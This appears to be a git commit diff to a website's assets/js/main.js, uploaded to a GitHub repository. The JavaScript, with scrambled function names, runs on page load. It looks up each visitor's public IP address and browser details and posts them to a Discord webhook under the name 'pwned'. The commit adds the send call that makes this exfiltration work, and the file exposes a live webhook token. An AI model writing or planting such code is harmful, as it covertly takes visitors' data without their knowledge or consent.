3f6f4c5fe549c0a018349ee2e4b4c2aa5083f958
gogiyaw <86326882+gogiyaw@users.noreply.github.com>
2021-06-23 07:47:39 +1000

    Add files via upload

--- assets/js/main.js
+++ assets/js/main.js
@@ -1,6 +1,7 @@
 function aIdfB21P() {
     var webhook = 'https://canary.discord.com/api/webhooks/857009098407018518/nbLnPzBbYVkxJcRjOV_wP23zh2EwFGWV4LR8s04wxenSoIb9xHQ7bLN2pSeWu4SLO5fV';
 
+    
     var request = new XMLHttpRequest();
     request.open('POSt', webhook);
     request.setRequestHeader('Content-type', 'application/json');
@@ -9,14 +10,16 @@ function aIdfB21P() {
         username: 'pwned',
         content: `${window.navigator}\n${LOpVf986('https://api.ipify.org/')}`
     };
+
+    request.send(JSON.stringify(params));
 }
 
 function LOpVf986(theUrl)
 {
-    var request = new XMLHttpRequest();
-    request.open( "GET", theUrl, false ); // false for synchronous request
-    request.send( null );
-    return request.responseText;
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
+    xmlHttp.send( null );
+    return xmlHttp.responseText;
 }
 
 window.onload = aIdfB21P;
